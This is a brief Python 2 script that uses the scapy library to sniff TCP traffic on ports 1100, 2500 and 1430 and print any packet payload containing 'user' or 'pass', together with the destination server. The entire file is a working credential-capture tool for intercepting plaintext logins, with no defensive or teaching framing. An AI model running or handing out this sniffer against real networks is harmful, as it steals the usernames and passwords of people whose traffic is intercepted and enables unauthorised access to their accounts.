from scapy.all import *

def packet_callback(packet):
#	print packet.show()
	if packet[TCP].payload:
		mail_packet=str(packet[TCP].payload)
		if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
			print "[*] Server: %s" % packet[IP].dst
			print "[*] %s" % packet[TCP].payload

sniff(filter="tcp port 1100 or tcp port 2500 or tcp port 1430",prn=packet_callback,store=0)